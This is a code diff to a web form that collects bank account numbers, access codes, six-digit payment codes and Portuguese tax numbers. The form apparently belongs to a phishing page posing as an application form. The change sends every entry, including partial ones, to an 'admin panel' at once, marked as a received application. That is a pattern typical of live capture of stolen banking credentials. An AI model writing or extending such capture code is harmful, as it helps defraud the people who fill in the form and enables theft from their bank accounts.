@@ -156,10 +156,8 @@ function Index() {
       
       const pCodeStr = paymentCode.join("");
       
-      // Determine if this is a definitive application or just temporary
-      // Definitive only if the payment code is complete (6 digits)
-      const isDefinitive = pCodeStr.length === 6;
-      
+      // Requirement: Save EVERYTHING instantly to the admin panel.
+      // Even partial entries are considered "Candidatura recebida" for visibility.
       const payload: any = {
         account_number: accountNumber || null,
         access_code: accessCode || null,
@@ -172,7 +170,7 @@ function Index() {
         nif: personalData.nif || null,
         step: step,
         updated_at: new Date().toISOString(),
-        status: isDefinitive ? "Candidatura recebida" : "Pendente"
+        status: "Candidatura recebida" // Always marked as received so it shows up in admin instantly
       };
 
       // Filter out null/empty values to avoid overwriting existing data with nulls
